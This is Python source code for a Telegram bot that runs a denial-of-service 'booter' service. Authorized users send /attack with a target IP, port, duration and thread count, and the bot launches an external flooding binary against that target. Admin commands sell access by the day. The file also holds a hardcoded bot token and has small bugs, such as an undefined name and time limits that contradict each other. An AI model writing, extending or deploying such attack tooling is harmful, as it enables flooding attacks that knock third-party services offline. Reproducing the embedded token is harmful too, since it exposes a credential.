
# Made By @MR_ARMAN_08

#  Join - @TEAM_X_OG

# This Is Licenced Under MT

import telebot
import subprocess
import threading
import time
import re
from datetime import datetime
from data import init_db, register_or_update_user, get_user_display_name, authorize_user, remove_authorization, is_authorized, get_authorized_users
from images import create_player_id_card

# ───────────────────────────
#   CONFIG
# ───────────────────────────
TOKEN = "8173260175:AAED_BFGPiXXqrY9lB3N1rqDI63-hkbXv2g"

ADMIN_ID = 8532824472
ADMIN_IDS = {8532824472}

ATTACK_BINARY = "./arman"

bot = telebot.TeleBot(TOKEN)

BOLD   = lambda s: f"<b>{s}</b>"
ITALIC = lambda s: f"<i>{s}</i>"
CODE   = lambda s: f"<code>{s}</code>"
SPARK  = "✨"
FIRE   = "🔥"
ROCKET = "🚀"
BOMB   = "💣"
CROWN  = "👑"
CHECK  = "✅"
CROSS  = "❌"
LOAD   = "⏳"
WAVE   = "🌊"

#─────────────────────────────
#   HELPER FUNCTIONS
# ────────────────────────────

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS
    
    
def is_valid_ip(ip: str) -> bool:
    pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    return bool(re.match(pattern, ip))

def is_valid_port(port: str) -> bool:
    try:
        p = int(port)
        return 1 <= p <= 65535
    except:
        return False

def is_valid_time(t: str) -> bool:
    try:
        sec = int(t)
        return 10 <= sec <= 199
    except:
        return False

def is_valid_thread(th: str) -> bool:
    try:
        t = int(th)
        return 1 <= t <= 200
    except:
        return False

# ──────────────────────────
#   ATTACK COMMAND
# ──────────────────────────
@bot.message_handler(commands=['attack'])
def cmd_attack(message):
    user = message.from_user
    username = user.username or user.first_name

    if not is_authorized(user.id):
        if is_admin(user.id):
            bot.reply_to(message,
                "⚠️  You are admin but **not authorized**.\n"
                "Use /addauth on yourself if needed.")
        else:
            bot.reply_to(message,
                "⛔ Access denied.\n"
                "This command is available only for authorized users.")
        return
        
    args = message.text.split()[1:]
    if len(args) != 4:
        bot.reply_to(message,
            f"{CROSS} <b>Wrong format!</b>\n\n"
            f"Use: <code>/attack [ip] [port] [time] [threads]</code>\n"
            f"Example: <code>/attack 1.1.1.1 80 120 50</code>",
            parse_mode="HTML"
        )
        return

    ip, port, time_sec, threads = args

    if not is_valid_ip(ip):
        bot.reply_to(message, f"{CROSS} Invalid IP address!", parse_mode="HTML")
        return

    if not is_valid_port(port):
        bot.reply_to(message, f"{CROSS} Port must be between 1–65535!", parse_mode="HTML")
        return

    if not is_valid_time(time_sec):
        bot.reply_to(message,
            f"{CROSS} Time must be between 10–1200 seconds!",
            parse_mode="HTML"
        )
        return

    if not is_valid_thread(threads):
        bot.reply_to(message,
            f"{CROSS} Threads must be between 1–200!",
            parse_mode="HTML"
        )
        return

    msg = bot.reply_to(message,
        f"{LOAD} <b>Processing attack request...</b>\n"
        f"{WAVE} Target validation in progress...",
        parse_mode="HTML"
    )

    time.sleep(1.5)

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=msg.message_id,
        text=f"{ROCKET} <b>Launching attack...</b>\n\n"
             f"Target  : <code>{ip}</code>\n"
             f"Port    : <code>{port}</code>\n"
             f"Time    : <code>{time_sec}s</code>\n"
             f"Threads : <code>{threads}</code>\n"
             f"Status  : {LOAD} Initializing...",
        parse_mode="HTML"
    )

    def run_attack():
        try:
            cmd = [ATTACK_BINARY, ip, port, time_sec, threads]
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=
f"""{FIRE} <b>Attack Started Successfully!</b> {BOMB}

IP     : <code>{ip}</code>
Port   : <code>{port}</code>
Time   : <code>{time_sec} sec</code>
Threads: <code>{threads}</code>
By     : @{username} {CROWN}

{FIRE} Status: Running {ROCKET}""",
                parse_mode="HTML",
                reply_markup=get_inline_buttons()
            )

            process.wait(timeout=int(time_sec) + 15)

            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=
f"""{CHECK} <b>Attack Completed!</b>

Target : <code>{ip}:{port}</code>
Duration : {time_sec} sec
Threads  : {threads}
Launched by : @{username}

{Spark} Stay tuned for updates!""",
                parse_mode="HTML",
                reply_markup=get_inline_buttons()
            )

        except Exception as e:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=f"{CROSS} <b>Error occurred!</b>\n\n<code>{str(e)}</code>",
                parse_mode="HTML"
            )

    threading.Thread(target=run_attack, daemon=True).start()


def get_inline_buttons():
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)

    btn_update = telebot.types.InlineKeyboardButton(
        text="🔔 Updates", url="https://t.me/CrimeZone_Update"
    )
    btn_feedback = telebot.types.InlineKeyboardButton(
        text="📩 Feedback", callback_data="feedback"
    )

    markup.add(btn_update, btn_feedback)
    return markup


# ──────────────────────────
#   FEEDBACK BUTTON HANDLER
# ──────────────────────────
@bot.callback_query_handler(func=lambda call: call.data == "feedback")
def on_feedback_click(call):
    bot.answer_callback_query(call.id)

    bot.send_message(
        call.from_user.id,
        f"{CHECK} <b>Feedback mode activated!</b>\n\n"
          "Please send your message/feedback/suggestion now.\n"
          "It will be forwarded directly to the admin.",
        parse_mode="HTML"
    )

    bot.register_next_step_handler_by_chat_id(
        call.from_user.id,
        forward_feedback
    )


def forward_feedback(message):
    if not message.text:
        bot.reply_to(message, "Only text feedback is accepted for now.")
        return

    user = message.from_user
    username = user.username or user.first_name
    uid = user.id

    feedback_text = (
        f"📩 <b>New Feedback Received!</b>\n\n"
        f"From : {username} (ID: <code>{uid}</code>)\n"
        f"Date : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"<code>{message.text}</code>\n\n"
        f"Reply to this message to answer directly."
    )

    try:
        bot.send_message(ADMIN_ID, feedback_text, parse_mode="HTML")
        bot.reply_to(message,
            f"{CHECK} Thank you! Your feedback has been sent to the admin."
        )
    except Exception:
        bot.reply_to(message,
            f"{CROSS} Failed to send feedback. Admin might have blocked the bot."
        )

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user = message.from_user
    
    register_or_update_user(user)
    
    display_name = get_user_display_name(user)
    
    try:
        card_bytes = create_player_id_card(user, bot_username=bot.get_me().username)
        
        caption = (
            "✦ ⋆⋅☆ WELCOME TO THE BATTLE ZONE ☆⋅⋆ ✦\n\n"
            f"<b>Agent {display_name}</b> — identified & registered 🔥\n\n"
            "Your Player ID Card has been generated.\n"
            "Use <code>/attack</code> to launch operations.\n\n"
            "Stay sharp. The grid never sleeps. 🌌"
        )

        bot.send_photo(
            message.chat.id,
            photo=card_bytes,
            caption=caption,
            parse_mode="HTML"
        )
        
    except Exception as e:
        bot.reply_to(message,
            f"✨ <b>Welcome, {display_name}!</b> ✨\n\n"
              "You're now in the system.\n"
              "Use <code>/attack [ip] [port] [time] [threads]</code> to begin.\n\n"
              f"(card generation failed: {str(e)})",
            parse_mode="HTML"
        )
        

@bot.message_handler(commands=['addauth'])
def cmd_addauth(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "⛔ You are not authorized to use this command.")
        return

    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message,
            "Usage:\n/addauth <user_id> [days]\n\nExample:\n/addauth 123456789 90")
        return

    try:
        target_id = int(parts[1])
        days = int(parts[2]) if len(parts) >= 3 else 30
    except ValueError:
        bot.reply_to(message, "Invalid number format.")
        return

    if days < 1 or days > 365:
        bot.reply_to(message, "Days must be between 1 and 365.")
        return

    expires_ts = authorize_user(
        user_id=target_id,
        days=days,
        authorized_by=message.from_user.id,
        note="Added via /addauth"
    )

    expires_date = datetime.fromtimestamp(expires_ts).strftime("%Y-%m-%d %H:%M")

    bot.reply_to(message,
        f"✅ User <code>{target_id}</code> authorized until <b>{expires_date}</b> ({days} days)",
        parse_mode="HTML")


@bot.message_handler(commands=['removeauth'])
def cmd_removeauth(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "⛔ You are not authorized to use this command.")
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /removeauth <user_id>")
        return

    try:
        target_id = int(parts[1])
    except ValueError:
        bot.reply_to(message, "Invalid user ID.")
        return

    removed = remove_authorization(target_id)

    if removed:
        bot.reply_to(message, f"🗑️ Authorization for user <code>{target_id}</code> removed.")
    else:
        bot.reply_to(message, f"No active authorization found for <code>{target_id}</code>.")


@bot.message_handler(commands=['listauth'])
def cmd_listauth(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "⛔ You are not authorized to use this command.")
        return

    authorized = get_authorized_users()

    if not authorized:
        bot.reply_to(message, "No users are currently authorized.")
        return

    lines = ["<b>Currently authorized users:</b>\n"]
    for u in authorized:
        username = f"@{u['username']}" if u['username'] else u['first_name']
        lines.append(
            f"• <code>{u['user_id']}</code>  —  {username}\n"
            f"   Expires: {u['expires']}\n"
            f"   Note: {u['note']}\n"
        )

    bot.reply_to(message, "\n".join(lines), parse_mode="HTML")
    


#        Start The Bot
# Made By @MR_ARMAN_08

# This Is Licenced Under MT


if __name__ == "__main__":
    print("Bot starting...")
    init_db()
    bot.infinity_polling()
